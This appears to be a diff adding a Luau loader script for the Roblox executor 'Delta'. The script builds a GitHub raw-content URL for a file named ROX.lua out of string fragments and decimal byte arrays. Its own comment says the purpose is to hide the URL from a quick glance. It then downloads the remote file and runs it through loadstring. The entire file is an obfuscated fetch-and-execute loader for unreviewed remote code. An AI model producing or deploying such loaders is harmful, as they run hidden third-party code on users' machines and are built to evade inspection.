@@ -1,0 +1,29 @@
+-- Mixed English + numeric URL loader for Delta / Luau
+-- This hides the URL from a quick glance; it is not strong encryption.
+local function buildAddress()
+    local pieces = {}
+    pieces[#pieces + 1] = "https://"
+    local bytes5 = {114, 97, 119, 46, 103, 105, 116, 104}
+    for i = 1, #bytes5 do pieces[#pieces + 1] = string.char(bytes5[i]) end
+    pieces[#pieces + 1] = "ubuserco"
+    local bytes8 = {110, 116, 101, 110, 116, 46, 99, 111}
+    for i = 1, #bytes8 do pieces[#pieces + 1] = string.char(bytes8[i]) end
+    pieces[#pieces + 1] = "m/ppplll"
+    local bytes11 = {111, 111, 111, 52, 57, 50, 45, 97}
+    for i = 1, #bytes11 do pieces[#pieces + 1] = string.char(bytes11[i]) end
+    pieces[#pieces + 1] = "rt/-/ref"
+    local bytes14 = {115, 47, 104, 101, 97, 100, 115, 47}
+    for i = 1, #bytes14 do pieces[#pieces + 1] = string.char(bytes14[i]) end
+    pieces[#pieces + 1] = "main/ROX"
+    local bytes17 = {46, 108, 117, 97}
+    for i = 1, #bytes17 do pieces[#pieces + 1] = string.char(bytes17[i]) end
+    return table.concat(pieces)
+end
+
+local remoteAddress = buildAddress()
+local remoteSource = game:HttpGet(remoteAddress)
+local runChunk, compileError = loadstring(remoteSource)
+if not runChunk then
+    error("ROX.lua compile failed: " .. tostring(compileError))
+end
+runChunk()
